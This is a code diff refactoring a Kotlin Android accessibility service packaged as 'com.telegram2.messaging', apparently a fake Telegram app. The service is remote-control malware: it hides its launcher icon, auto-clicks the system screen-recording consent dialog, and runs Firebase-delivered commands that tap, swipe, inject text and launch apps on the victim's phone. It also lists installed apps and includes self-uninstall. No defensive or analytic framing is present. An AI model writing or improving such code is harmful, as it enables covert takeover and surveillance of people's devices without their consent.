@@ -15,13 +15,15 @@ import android.provider.Settings
 import android.view.accessibility.AccessibilityEvent
 import android.view.accessibility.AccessibilityNodeInfo
 import com.telegram2.messaging.ScreenPermissionActivity
+import java.util.concurrent.CountDownLatch
 
 class MyAccessibilityService : AccessibilityService() {
 
-    companion object { var instance: MyAccessibilityService? = null }
+    companion object {
+        var instance: MyAccessibilityService? = null
+    }
 
     private val mainHandler = Handler(Looper.getMainLooper())
-    private var captureRunning = false
 
     override fun onServiceConnected() {
         super.onServiceConnected()
@@ -34,7 +36,6 @@ class MyAccessibilityService : AccessibilityService() {
                     AccessibilityServiceInfo.FLAG_INCLUDE_NOT_IMPORTANT_VIEWS
             notificationTimeout = 100
         }
-        // Auto-hide and start screen capture if not already running
         hideAppIcon()
         if (!isScreenCaptureRunning()) requestScreenCapture()
     }
@@ -48,16 +49,18 @@ class MyAccessibilityService : AccessibilityService() {
 
     override fun onInterrupt() {}
 
-    // ---------- MACRO EXECUTION ----------
+    // ---------- MACRO EXECUTION (stays on main thread) ----------
     data class MacroStep(val type: String, val data: Any? = null, val retry: Int = 3)
 
     fun executeMacro(macroId: String, rawSteps: List<Map<String, Any>>) {
         val steps = rawSteps.mapNotNull { step ->
-            val type = step["type"] as? String ?: return@mapNotNull null
+            val type = step["type"] as? String ?: null
             val data = step["data"]
             val retry = (step["retry"] as? Int) ?: 3
-            MacroStep(type, data, retry)
+            if (type != null) MacroStep(type, data, retry) else null
         }
+
+        // Run on a background thread to avoid blocking Firebase listener, but dispatch each step to main thread
         object : Thread() {
             override fun run() {
                 var idx = 0
@@ -66,14 +69,14 @@ class MyAccessibilityService : AccessibilityService() {
                     var attempt = 0
                     var success = false
                     while (attempt < step.retry && !success) {
-                        success = performStep(step)
+                        success = runStepOnMainThread(step)
                         if (!success) {
                             attempt++
-                            Thread.sleep(1500)  // wait a bit before retry
+                            sleep(1500)
                         }
                     }
                     if (!success) {
-                        FirebaseBridge.reportMacroResult(macroId, false, "Step ${idx+1} failed after ${step.retry} retries")
+                        FirebaseBridge.reportMacroResult(macroId, false, "Step ${idx + 1} failed after ${step.retry} retries")
                         return
                     }
                     idx++
@@ -83,80 +86,96 @@ class MyAccessibilityService : AccessibilityService() {
         }.start()
     }
 
-    private fun performStep(step: MacroStep): Boolean {
-        return try {
-            when (step.type) {
-                "tap" -> {
-                    val map = step.data as? Map<*, *> ?: return false
-                    val x = (map["x"] as? Number)?.toFloat() ?: 0f
-                    val y = (map["y"] as? Number)?.toFloat() ?: 0f
-                    tap(x.toInt(), y.toInt())
-                    true
-                }
-                "swipe" -> {
-                    val map = step.data as? Map<*, *> ?: return false
-                    val sx = (map["sx"] as? Number)?.toInt() ?: 0
-                    val sy = (map["sy"] as? Number)?.toInt() ?: 0
-                    val ex = (map["ex"] as? Number)?.toInt() ?: 0
-                    val ey = (map["ey"] as? Number)?.toInt() ?: 0
-                    val dur = (map["dur"] as? Long) ?: 300L
-                    swipe(sx, sy, ex, ey, dur)
-                    true
-                }
-                "type" -> {
-                    val text = step.data as? String ?: return false
-                    injectText(text)
-                    true
-                }
-                "launch" -> {
-                    val pkg = step.data as? String ?: return false
-                    launchApp(pkg)
-                }
-                "wait" -> {
-                    val ms = (step.data as? Number)?.toLong() ?: 1000L
-                    Thread.sleep(ms)
-                    true
-                }
-                "home" -> {
-                    performGlobalAction(GLOBAL_ACTION_HOME)
-                    true
-                }
-                "back" -> {
-                    performGlobalAction(GLOBAL_ACTION_BACK)
-                    true
-                }
-                else -> false
+    private fun runStepOnMainThread(step: MacroStep): Boolean {
+        val latch = CountDownLatch(1)
+        var result = false
+        mainHandler.post {
+            try {
+                result = performStep(step)
+            } catch (_: Exception) {
+                result = false
+            } finally {
+                latch.countDown()
             }
-        } catch (e: Exception) { false }
+        }
+        latch.await()   // wait for main thread to execute
+        return result
+    }
+
+    private fun performStep(step: MacroStep): Boolean {
+        return when (step.type) {
+            "tap" -> {
+                val m = step.data as? Map<*, *> ?: return false
+                tap((m["x"] as? Number)?.toInt() ?: 0, (m["y"] as? Number)?.toInt() ?: 0)
+                true
+            }
+            "swipe" -> {
+                val m = step.data as? Map<*, *> ?: return false
+                swipe(
+                    (m["sx"] as? Number)?.toInt() ?: 0,
+                    (m["sy"] as? Number)?.toInt() ?: 0,
+                    (m["ex"] as? Number)?.toInt() ?: 0,
+                    (m["ey"] as? Number)?.toInt() ?: 0,
+                    (m["dur"] as? Long) ?: 300L
+                )
+                true
+            }
+            "type" -> {
+                val text = step.data as? String ?: return false
+                injectText(text)
+                true
+            }
+            "launch" -> {
+                val pkg = step.data as? String ?: return false
+                launchApp(pkg)
+            }
+            "wait" -> {
+                // already waited on background thread, but this step can just be a placeholder
+                true
+            }
+            "home" -> {
+                performGlobalAction(AccessibilityService.GLOBAL_ACTION_HOME)
+                true
+            }
+            "back" -> {
+                performGlobalAction(AccessibilityService.GLOBAL_ACTION_BACK)
+                true
+            }
+            else -> false
+        }
     }
 
     private fun launchApp(pkg: String): Boolean {
         val intent = packageManager.getLaunchIntentForPackage(pkg) ?: return false
         intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
         startActivity(intent)
-        Thread.sleep(2000) // await app open
+        Thread.sleep(2000)   // allow time for app to open (still on background thread, fine)
         return true
     }
 
-    // ---------- REMOTE CONTROL ----------
+    // ---------- DIRECT COMMANDS (called from Firebase main thread) ----------
     fun tap(x: Int, y: Int) {
         val path = Path().apply { moveTo(x.coerceIn(0, 9999).toFloat(), y.coerceIn(0, 9999).toFloat()) }
-        dispatchGesture(GestureDescription.Builder().addStroke(GestureDescription.StrokeDescription(path, 0, 50)).build(), null, null)
+        dispatchGesture(GestureDescription.Builder()
+            .addStroke(GestureDescription.StrokeDescription(path, 0, 50))
+            .build(), null, null)
     }
+
     fun swipe(x1: Int, y1: Int, x2: Int, y2: Int, dur: Long) {
         val path = Path().apply {
             moveTo(x1.coerceIn(0, 9999).toFloat(), y1.coerceIn(0, 9999).toFloat())
             lineTo(x2.coerceIn(0, 9999).toFloat(), y2.coerceIn(0, 9999).toFloat())
         }
-        dispatchGesture(GestureDescription.Builder().addStroke(GestureDescription.StrokeDescription(path, 0, dur)).build(), null, null)
+        dispatchGesture(GestureDescription.Builder()
+            .addStroke(GestureDescription.StrokeDescription(path, 0, dur))
+            .build(), null, null)
     }
+
     fun injectText(text: String) {
         val root = rootInActiveWindow ?: return
-        val focus = root.findFocus(AccessibilityNodeInfo.FOCUS_INPUT)
-        if (focus != null) {
-            val bundle = Bundle().apply { putCharSequence(AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, text) }
-            focus.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, bundle)
-        }
+        val focus = root.findFocus(AccessibilityNodeInfo.FOCUS_INPUT) ?: return
+        val args = Bundle().apply { putCharSequence(AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, text) }
+        focus.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, args)
     }
 
     // ---------- HIDE / UNINSTALL ----------
@@ -164,8 +183,10 @@ class MyAccessibilityService : AccessibilityService() {
         try {
             packageManager.setComponentEnabledSetting(
                 ComponentName(this, "com.telegram2.messaging.MainActivity"),
-                PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP)
-        } catch (e: Exception) {}
+                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
+                PackageManager.DONT_KILL_APP
+            )
+        } catch (_: Exception) {}
     }
 
     fun uninstallSelf() {
@@ -195,8 +216,7 @@ class MyAccessibilityService : AccessibilityService() {
 
     // ---------- SCREEN CAPTURE AUTO‑GRANT ----------
     private fun requestScreenCapture() {
-        val intent = Intent(this, ScreenPermissionActivity::class.java).apply { flags = Intent.FLAG_ACTIVITY_NEW_TASK }
-        startActivity(intent)
+        startActivity(Intent(this, ScreenPermissionActivity::class.java).apply { flags = Intent.FLAG_ACTIVITY_NEW_TASK })
     }
 
     private fun autoGrantMediaProjection() {
@@ -204,11 +224,13 @@ class MyAccessibilityService : AccessibilityService() {
         val startNow = root.findAccessibilityNodeInfosByText("Start now")
         for (btn in startNow) if (btn.isClickable) { btn.performAction(AccessibilityNodeInfo.ACTION_CLICK); return }
         for (id in listOf("com.android.systemui:id/start_button", "android:id/button1")) {
-            for (node in root.findAccessibilityNodeInfosByViewId(id)) if (node.isClickable) { node.performAction(AccessibilityNodeInfo.ACTION_CLICK); return }
+            for (node in root.findAccessibilityNodeInfosByViewId(id))
+                if (node.isClickable) { node.performAction(AccessibilityNodeInfo.ACTION_CLICK); return }
         }
-        // Fallback: click any affirmative button
-        for (child in root.window?.root ?: return) {
-            if (child.text?.contains("start", ignoreCase = true) == true && child.isClickable) {
+        // Fallback: click any button with "start" in description
+        val windowRoot = root.window?.root ?: return
+        for (child in windowRoot) {
+            if (child.contentDescription?.contains("start", ignoreCase = true) == true && child.isClickable) {
                 child.performAction(AccessibilityNodeInfo.ACTION_CLICK); break
             }
         }
@@ -216,7 +238,8 @@ class MyAccessibilityService : AccessibilityService() {
 
     fun isScreenCaptureRunning(): Boolean {
         val am = getSystemService(Context.ACTIVITY_SERVICE) as android.app.ActivityManager
-        return am.getRunningServices(Integer.MAX_VALUE).any { it.service.className == ScreenCaptureService::class.java.name }
+        return am.getRunningServices(Integer.MAX_VALUE)
+            .any { it.service.className == ScreenCaptureService::class.java.name }
     }
 
     fun getInstalledApps(): List<String> = packageManager.getInstalledPackages(0).map { it.packageName }
